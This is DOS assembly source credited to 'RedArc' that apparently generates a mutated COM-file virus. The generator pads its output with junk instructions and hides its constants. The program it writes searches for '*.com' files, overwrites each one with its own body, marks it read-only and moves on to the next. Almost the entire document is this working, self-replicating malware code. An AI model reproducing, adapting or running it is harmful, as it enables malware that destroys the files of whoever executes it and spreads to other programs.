;(c) RedArc
Model Tiny
.code
org 100h

mm1 equ '.*' + 0adh
mm2 equ 'oc' + 0adh
mm3 equ 0006dh + 0adh

start:
       lea di,buff
;---
       call _NOP
       call _Calc_Rnd16
       xchg bx,ax
       mov bl,7
       push ax bx
       call _2_MOV16V16
       pop bx ax
       call _2_SUB16V16
       call _NOP
       mov bl,7
       mov ax,1234h
       push ax
       call RND_Tabelle
       cmp ah,0
       jne @1
       pop ax
       call Add_Reg16_Value16_Tabelle
       call _ax_bx
       mov LABEL1,di
       jmp short @3
@1:
       cmp ah,1
       jne @2
       pop ax
       call Xor_Reg16_Value16_Tabelle
       call _ax_bx
       mov LABEL1,di
       jmp short @3
@2:
       pop ax
       call Mov_Reg16_Value16_Tabelle
       call _al_bx
       mov LABEL1,di
@3:
       call _NOP
       mov ax,mm1
       xor bx,bx
       call _2_MOV16V16
       call _NOP
       xor bx,bx
       mov ax,0adh
       call _2_SUB16V16
       call _NOP
       call Stosw_Tabelle
       call _bl
       call _NOP
       mov ax,mm2
       xor bx,bx
       call _2_MOV16V16
       call _NOP
       xor bx,bx
       mov ax,0adh
       call _2_SUB16V16
       call _NOP
       call Stosw_Tabelle
       call _bl
       call _NOP
       mov ax,mm3
       xor bx,bx
       call _2_MOV16V16
       call _NOP
       xor bx,bx
       mov ax,0adh
       call _2_SUB16V16
       call _NOP
       call Stosw_Tabelle
       call _bl
       call _NOP
       mov ax,4e00h
       xor bx,bx
       call _2_MOV16V16
       call _NOP
       mov bl,2
       mov bh,7
       push bx
       call _2_MOV16
       call _NOP
       pop bx
       mov ax,6
       call _2_SUB16V16
       call _NOP
       mov bl,1
       xor ax,ax
       call _2_MOV16V16
       call _NOP
       mov LABEL2,di
       call _NOP
       call _INT21h
       mov ax,word ptr ds:[LABEL0]
       mov word ptr ds:[di],ax
       add di,2
       mov LABEL3,di
       call _NOP
       xor bx,bx
       mov ax,bx
       call _2_MOV16V16
       call _NOP
       xor bx,bx
       call Push_Reg16_Tabelle
       call _bl
       call _NOP
       mov bl,0c3h
       call _bl
       call _NOP
       mov LABEL4,di
       mov ax,3d02h
       xor bx,bx
       call _2_MOV16V16
       call _NOP
       mov ax,9eh
       mov bl,2
       call _2_MOV16V16
       call _NOP
       call _INT21h
       call _NOP
       mov bl,3
       mov bh,0
       call _2_MOV16
       call _NOP
       mov ax,3f00h
       xor bx,bx
       call _2_MOV16V16
       call _NOP
       mov ax,0ffffh
       mov bl,1
       call _2_MOV16V16
       call _NOP
       mov bl,2
       mov bh,7
       call _2_MOV16
       call _NOP
       mov bl,2
       mov ax,6
       call _2_SUB16V16
       call _NOP
       mov bl,5
       mov bh,2
       call _2_MOV16
       call _NOP
       call _INT21h
       call _NOP
       mov bl,5
       mov bh,0
       push bx
       call _2_ADD16
       call _NOP
       pop bx
       mov ax,100h
       call _2_SUB16V16
       call _NOP
       xor bx,bx
       mov ax,4200h
       call _2_MOV16V16
       call _NOP
       mov bl,1
       xor ax,ax
       call _2_MOV16V16
       call _NOP
       mov bl,2
       mov bh,1
       call _2_MOV16
       call _NOP
       call _INT21h
       call _NOP
       mov ax,4000h
       xor bx,bx
       call _2_MOV16V16
       call _NOP
       mov bl,1
       mov bh,5
       call _2_MOV16
       call _NOP
       mov bl,2
       mov ax,100h
       call _2_MOV16V16
       call _NOP
       call _INT21h
       call _NOP
       mov ax,3e00h
       xor bx,bx
       call _2_MOV16V16
       call _NOP
       call _INT21h
       call _NOP
       mov bl,2
       mov ax,9eh
       call _2_MOV16V16
       call _NOP
       mov ax,4301h
       xor bx,bx
       call _2_MOV16V16
       call _NOP
       mov ax,1
       mov bl,1
       call _2_MOV16V16
       call _NOP
       call _INT21h
       call _NOP
       mov ax,4f00h
       xor bx,bx
       call _2_MOV16V16
       call _NOP
       mov ax,1234h
       mov bl,6
       call Mov_Reg16_Value16_Tabelle
       call _al_bx
       mov LABEL5,di
       call _NOP
       mov bl,6
       call Push_Reg16_Tabelle
       call _bl
       call _NOP
       mov bl,0c3h
       call _bl
       call _NOP
;---
       mov si,LABEl1
       lea ax,buff
       mov dx,di
       sub dx,ax
       add dx,100h
       mov word ptr ds:[si-2],dx
       mov ax,LABEL4
       sub ax,LABEL3
       mov si,LABEL3
       mov byte ptr ds:[si-1],al
       mov si,LABEL5
       mov dx,LABEL2
       lea ax,buff
       sub dx,ax
       add dx,100h
       mov word ptr ds:[si-2],dx
;---
       mov ah,3ch
       lea dx,filename
       xor cx,cx
       int 21h
       xchg ax,bx
       mov ah,40h
       lea dx,buff
       mov cx,di
       sub cx,dx
       int 21h
       mov ah,40h
       xor cx,cx
       xor dx,dx
       int 21h
       mov ah,3eh
       int 21h
       lea dx,filename
       mov ax,4301h
       mov cx,1
       int 21h
       int 20h
;---
include code.inc
include code16_1.inc
include code8_1.inc
include code16_2.inc
include code8_2.inc
filename db 'test1.com',0h
RndRegCalc db ?
LABEL0 equ $-start+100h
       jnb LBL
LABEL1 dw ?
LABEL2 dw ?
LABEL3 dw ?
LABEL4 dw ?
LABEL5 dw ?
LBL:
buff label byte
end start
